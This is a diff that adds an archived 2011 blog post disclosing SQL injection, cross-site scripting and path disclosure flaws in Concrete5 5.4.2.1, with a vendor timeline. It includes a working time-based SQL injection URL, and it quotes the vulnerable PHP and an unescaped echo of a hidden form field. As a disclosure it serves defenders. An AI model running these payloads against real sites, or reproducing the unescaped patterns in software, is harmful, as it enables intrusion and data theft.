@@ -1,0 +1,90 @@
+---
+layout: post
+status: publish
+published: true
+title: Concrete5 <= 5.4.2.1 SQL Injection and XSS Vulnerabilities
+author:
+  display_name: ethicalhack3r
+  login: ethicalhack3r
+  email: ryandewhurst@gmail.com
+  url: ''
+author_login: ethicalhack3r
+author_email: ryandewhurst@gmail.com
+excerpt: "# Exploit Title: Concrete5 < = 5.4.2.1 SQL Injection and XSS Vulnerabilities\r\n#
+  Date: 2011-10-04\r\n# Author: Ryan Dewhurst (ryandewhurst at gmail) (@ethicalhack3r)(www.ethicalhack3r.co.uk)\r\n#
+  Software Link: http://sourceforge.net/projects/concretecms/files/concrete5/5.4.2.1/\r\n#
+  Version: 5.4.2.1 (tested)\r\n\r\n1.Vulnerability Description\r\n\r\nMultiple SQL
+  Injection, Cross-Site Scripting (XSS) and Information Disclosure vulnerabilities
+  were identified within Concrete5 version 5.4.2.1\r\n\r\nPlease note: Only a select
+  few vulnerabilities are outlined in this disclosure, many other vulnerabilities
+  were discovered. Due to time restraints only a small sample of the vulnerabilities
+  are outlined below. The vendor was contacted and replied promptly. Further assistance
+  was asked for but not delivered due to my time constraints.\r\n\r\n2.Software Description\r\n\r\nCMS
+  made for Marketing but built for Geeks, concrete5 [0] is a content management system
+  that is free and open source.\r\n\r\n"
+wordpress_id: 16555
+wordpress_url: http://www.ethicalhack3r.co.uk/?p=16555
+date: '2011-10-04 12:52:06 +0100'
+date_gmt: '2011-10-04 11:52:06 +0100'
+---
+<p># Exploit Title: Concrete5 < = 5.4.2.1 SQL Injection and XSS Vulnerabilities<br />
+# Date: 2011-10-04<br />
+# Author: Ryan Dewhurst (ryandewhurst at gmail) (@ethicalhack3r)(www.ethicalhack3r.co.uk)<br />
+# Software Link: http://sourceforge.net/projects/concretecms/files/concrete5/5.4.2.1/<br />
+# Version: 5.4.2.1 (tested)</p>
+<p>1.Vulnerability Description</p>
+<p>Multiple SQL Injection, Cross-Site Scripting (XSS) and Information Disclosure vulnerabilities were identified within Concrete5 version 5.4.2.1</p>
+<p>Please note: Only a select few vulnerabilities are outlined in this disclosure, many other vulnerabilities were discovered. Due to time restraints only a small sample of the vulnerabilities are outlined below. The vendor was contacted and replied promptly. Further assistance was asked for but not delivered due to my time constraints.</p>
+<p>2.Software Description</p>
+<p>CMS made for Marketing but built for Geeks, concrete5 [0] is a content management system that is free and open source.</p>
+<p><a id="more"></a><a id="more-16555"></a></p>
+<p>3.SQLi PoC [1] (authenticated user)</p>
+<p>http://concrete5.4.2/index.php/dashboard/reports/surveys/?ccm_order_by=numberOfResponses&ccm_order_dir=,(SELECT BENCHMARK(1000000,MD5(1)) FROM btSurveyResults where CURRENT_USER() like 'root@localhost' limit 1) -- </p>
+<p>4.Vulnerable code</p>
+<p>File: concrete/controllers/dashboard/reports/surveys.php</p>
+<p>[php]<br />
+class SurveyList extends DatabaseItemList {<br />
+       protected $itemsPerPage = 10;<br />
+       protected $autoSortColumns = array('cvName', 'question',<br />
+'numberOfResponses', 'lastResponse');</p>
+<p>       function __construct() {<br />
+               $this->setQuery(<br />
+                          'select distinct btSurvey.bID,<br />
+CollectionVersions.cID, btSurvey.question, CollectionVersions.cvName,<br />
+(select max(timestamp) from btSurveyResults where btSurveyResults.bID<br />
+= btSurvey.bID and btSurveyResults.cID = CollectionVersions.cID) as<br />
+lastResponse, (select count(timestamp) from btSurveyResults where<br />
+btSurveyResults.bID = btSurvey.bID and btSurveyResults.cID =<br />
+CollectionVersions.cID) as numberOfResponses ' .<br />
+                               'from btSurvey, CollectionVersions,<br />
+CollectionVersionBlocks');<br />
+               $this->filter(false, 'btSurvey.bID =<br />
+CollectionVersionBlocks.bID');<br />
+               $this->filter(false, 'CollectionVersions.cID =<br />
+CollectionVersionBlocks.cID');<br />
+               $this->filter(false, 'CollectionVersionBlocks.cvID =<br />
+CollectionVersionBlocks.cvID');<br />
+               $this->filter(false, 'CollectionVersions.cvIsApproved = 1');<br />
+               $this->userPostQuery .= 'group by btSurvey.bID,<br />
+CollectionVersions.cID';<br />
+       }<br />
+}<br />
+[/php]</p>
+<p>5.Cross-Site Scripting (XSS)</p>
+<p>Page: http://192.168.1.105/concrete5.4.2/index.php/login/forgot_password/<br />
+Parameter: rcID<br />
+Method: POST<br />
+PoC: Any JavaScript</p>
+<p>6.Vulnerable Code</p>
+<p>File: concrete/single_pages/login.php:</p>
+<p>[html]<input type="hidden" name="rcID" value="< ?php echo $rcID?/>">[/html]</p>
+<p>7.Full Path Disclosure (FPD)</p>
+<p>http://concrete5.4.2/index.php/tools/blocks/page_list/blog_rss?bID=30&cID='&arHandle=Main</p>
+<p>8.Vulnerability Timeline</p>
+<p>2011-09-06 - Reported to vendor<br />
+2011-09-06 - Vendor Reply<br />
+2011-09-07 - Vendor Acknowledge Vulnerabilities and asked for assistance patching. No assistance given apart from the initial report due to time constraints.<br />
+2011-10-04 - Vulnerability Disclosed</p>
+<p>9.References</p>
+<p>[0] <a href="http://www.concrete5.org/" target="_blank">http://www.concrete5.org/</a><br />
+[1] <a href="http://www.bonsai-sec.com/blog/index.php/not-the-average-sql-injection/" target="_blank">http://www.bonsai-sec.com/blog/index.php/not-the-average-sql-injection/</a></p>
